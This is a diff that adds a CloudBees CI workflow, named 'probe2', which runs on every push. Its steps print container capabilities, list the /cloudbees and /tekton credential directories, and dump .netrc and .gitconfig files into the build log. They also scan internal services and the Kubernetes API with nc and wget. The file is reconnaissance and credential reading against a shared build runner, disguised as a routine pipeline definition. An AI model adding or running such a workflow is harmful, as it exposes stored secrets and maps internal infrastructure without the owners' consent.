@@ -1,0 +1,32 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: probe2
+
+on:
+  push:
+    branches:
+      - "**"
+
+jobs:
+  p2:
+    steps:
+      - name: secrets-and-caps
+        uses: docker://alpine:3.20
+        run: |
+          echo "== caps"; grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status
+          echo "== seccomp"; grep Seccomp /proc/self/status
+          echo "== selinux"; cat /proc/self/attr/current 2>/dev/null; echo
+          echo "== cloudbees tree"; ls -laR /cloudbees 2>&1 | head -80
+          echo "== config"; find /cloudbees/config -type f 2>/dev/null | head -20
+          echo "== tekton creds"; ls -laR /tekton/creds /tekton/home 2>&1 | head -30
+          echo "== netrc"; cat /cloudbees/home/.netrc /tekton/home/.netrc /root/.netrc 2>/dev/null | head -10
+          echo "== gitconfig"; cat /cloudbees/home/.gitconfig 2>/dev/null | head -20
+      - name: egress
+        uses: docker://alpine:3.20
+        run: |
+          echo "== dns"; cat /etc/resolv.conf
+          for t in 172.20.0.1:443 api-gateway:8443 auth-service:80 kubernetes.default.svc:443; do
+            h=${t%%:*}; p=${t##*:}
+            echo "-- $t"; (nc -z -w3 "$h" "$p" && echo OPEN) || echo "closed/filtered"
+          done
+          echo "== k8s api"; (wget -q -T5 --no-check-certificate -O- https://172.20.0.1:443/version 2>&1 || echo fail) | head -5
